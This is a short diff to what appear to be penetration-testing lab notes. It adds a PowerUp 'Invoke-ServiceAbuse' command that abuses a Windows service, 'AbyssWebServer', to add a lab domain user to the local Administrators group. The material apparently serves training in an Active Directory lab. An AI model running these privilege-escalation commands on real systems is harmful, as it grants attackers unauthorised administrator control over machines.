@@ -137,3 +137,7 @@ Abuse the service
 ```PowerUp
 Invoke-ServiceAbuse -Name 'AbyssWebServer'
 ```
+or to add ou user to the Local Administrator group
+```PowerUp
+Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student115' -Verbose
+```
